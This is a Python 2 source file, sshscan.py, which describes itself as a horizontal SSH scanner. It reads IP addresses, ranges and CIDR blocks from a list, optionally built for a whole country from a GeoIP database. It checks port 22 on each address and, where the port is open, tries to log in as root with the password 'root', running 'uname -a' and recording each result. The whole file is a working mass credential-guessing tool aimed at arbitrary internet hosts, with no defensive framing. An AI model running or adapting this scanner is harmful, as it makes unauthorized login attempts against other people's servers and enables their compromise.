#!/usr/bin/env python

# sshscan.py 0.9 - Horizontal SSH scanner
# VVestron Phoronix
#
# sshscan.py is a horizontal SSH scanner that scans large
# swaths of IPv4 space for a single SSH user and pass. It
# uses iplist.txt as the input of IP addresses in the form
# of X.X.X.X, X.X.X.X/XX, X.X.X.X-X.X.X.X, or X.X.X.X-X with
# X-X in any octect.
#
# Usage: python -u sshscan.py
#
# IP country database:
# http://geolite.maxmind.com/download/geoip/database/GeoIPCountryCSV.zip
#
# #!/bin/bash
# grep -i "$1" GeoIPCountryWhois.csv | awk -F, '{print $1"-"$2}' | sed -e 's/"//g' > iplist.txt
#
# checkServer function by Brad Peters - brad (at) endperform (dot) org
# ipRange function from http://cmikavac.net/2011/09/11/how-to-generate-an-ip-range-list-in-python/
#
# SSH with pexpect example:
# http://linux.byexamples.com/archives/346/python-how-to-access-ssh-with-pexpect/

import datetime
import netaddr
import os
import pexpect
import random
import re
import socket
import sys

# Define connection string, user, and pass
CNNX = 'Are you sure you want to continue connecting'
USER = 'root'
PASS = 'root'

# Convert an IP range into start and end IPs
def rangeStr(testip):
    start_ip = []
    end_ip   = []

    matchAll = re.search('(\d{1,3}\-\d{1,3}|\d{1,3})\.(\d{1,3}\-\d{1,3}|\d{1,3})\.(\d{1,3}\-\d{1,3}|\d{1,3})\.(\d{1,3}\-\d{1,3}|\d{1,3})', testip)

    for i in range(1, 5):
        matchRange = re.search('(\d{1,3})\-(\d{1,3})', matchAll.group(i))
        if matchRange:
            start_ip.append(matchRange.group(1))
            end_ip.append(matchRange.group(2))
        else:
            start_ip.append(matchAll.group(i))
            end_ip.append(matchAll.group(i))

    start_ip_str = ".".join(map(str, start_ip))
    end_ip_str = ".".join(map(str, end_ip))

    return start_ip_str, end_ip_str

# Generate an IP list given the first and last IPs
def ipRange(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []
    
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i-1] += 1
        ip_range.append(".".join(map(str, temp)))
       
    return ip_range
    
# Checks the SSH port
def checkServer(ip_from_list):
    serverSocket = socket.socket()
    serverSocket.settimeout(0.5)
    try:
        serverSocket.connect((ip_from_list, 22))
    except socket.error:
        return 1

# Attempt to connect to SSH
def cnnxAttempt(target):
    child = pexpect.spawn('ssh %s@%s uname -a' % (USER, target))

    try:
        i = child.expect([CNNX, '[Pp]assword: ', pexpect.EOF])
        if i == 0:
            print "Sending 'yes'..."
            child.sendline('yes')
            i = child.expect([CNNX, '[Pp]assword: ', pexpect.EOF])
        if i == 1:
            print "Sending password...",
            child.sendline(PASS)
            child.expect(pexpect.EOF, timeout=5)
        elif i == 2:
            print "Connection failed"
            pass

        # Print output
        print child.before
        output.write(child.before)

    except:
        print "Unexpected error:", sys.exc_info()[0]

# Get date for output file 
today = datetime.datetime.now()
date = today.strftime("%Y%m%dT%H%M")
output_filename = 'sshscan-output-' + date + '.txt'

input  = open('iplist.txt', 'r')
output = open(output_filename, 'w')

# Randomize lines in input file
rand_lines = input.readlines()
random.shuffle(rand_lines)

# Get total number of lines
total_lines = len(rand_lines)
count_lines = 0

# Iterate through IPs and check SSH
for line in rand_lines:
    count_lines += 1

    newline = line.strip()

    match_comments = re.search('^#', newline)
    if match_comments:
        continue

    match_ip = re.search('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', newline)
    if match_ip:
        # If status is defined, we know the connection failed
        status = checkServer(newline)
        if status:
            print "%d/%d \tHost: %s \tPort: 22/closed" % (count_lines, total_lines, newline)
        else:
            print "%d/%d \tHost: %s \tPort: 22/open" % (count_lines, total_lines, newline)
            output.write('Host: ' + newline + '\tPort: 22/open\n')
            cnnxAttempt(newline)

    match_cidr = re.search('\/\d{1,2}$', newline)
    if match_cidr:
        # Randomize lines in netblocks
        ip_list = netaddr.IPNetwork(newline)
        rand_ip_list = list(ip_list)
        random.shuffle(rand_ip_list)

        # Get total number of IPs
        total_ips = len(rand_ip_list)
        count_ips = 0

        for ip in rand_ip_list:
            count_ips += 1

            # Don't scan network and broadcast addresses
            match_badip = re.search('\.(0|255)$', str(ip))
            if match_badip:
                continue
            # If status is defined, we know the connection failed
            status = checkServer(str(ip))
            if status:
                print "%d/%d (%d/%d) \tHost: %s \tPort: 22/closed" % (count_lines, total_lines, count_ips, total_ips, str(ip))
            else:
                print "%d/%d (%d/%d) \tHost: %s \tPort: 22/open" % (count_lines, total_lines, count_ips, total_ips, str(ip))
                output.write('Host: ' + str(ip) + '\tPort: 22/open\n')
                cnnxAttempt(str(ip))

    match_dash = re.search('\d-\d', newline)
    if match_dash:
        match_whole = re.search('(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})-(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', newline)
        if match_whole:
            ip_list = ipRange(match_whole.group(1), match_whole.group(2))

            rand_ip_list = list(ip_list)
            random.shuffle(rand_ip_list)

            # Get total number of IPs
            total_ips = len(rand_ip_list)
            count_ips = 0

            for ip in rand_ip_list:
                count_ips += 1

                # Don't scan network and broadcast addresses
                match_badip = re.search('\.0|255$', str(ip))
                if match_badip:
                    continue
                # If status is defined, we know the connection failed
                status = checkServer(str(ip))
                if status:
                    print "%d/%d (%d/%d) \tHost: %s \tPort: 22/closed" % (count_lines, total_lines, count_ips, total_ips, str(ip))
                else:
                    print "%d/%d (%d/%d) \tHost: %s \tPort: 22/open" % (count_lines, total_lines, count_ips, total_ips, str(ip))
                    output.write('Host: ' + str(ip) + '\tPort: 22/open\n')
                    cnnxAttempt(str(ip))

        else:
            first_ip, last_ip = rangeStr(newline)
            ip_list = ipRange(first_ip, last_ip)

            rand_ip_list = list(ip_list)
            random.shuffle(rand_ip_list)

            # Get total number of IPs
            total_ips = len(rand_ip_list)
            count_ips = 0

            for ip in rand_ip_list:
                count_ips += 1

                # Don't scan network and broadcast addresses
                match_badip = re.search('\.0|255$', str(ip))
                if match_badip:
                    continue
                # If status is defined, we know the connection failed
                status = checkServer(str(ip))
                if status:
                    print "%d/%d (%d/%d) \tHost: %s \tPort: 22/closed" % (count_lines, total_lines, count_ips, total_ips, str(ip))
                else:
                    print "%d/%d (%d/%d) \tHost: %s \tPort: 22/open" % (count_lines, total_lines, count_ips, total_ips, str(ip))
                    output.write('Host: ' + str(ip) + '\tPort: 22/open\n')
                    cnnxAttempt(str(ip))

output.close()
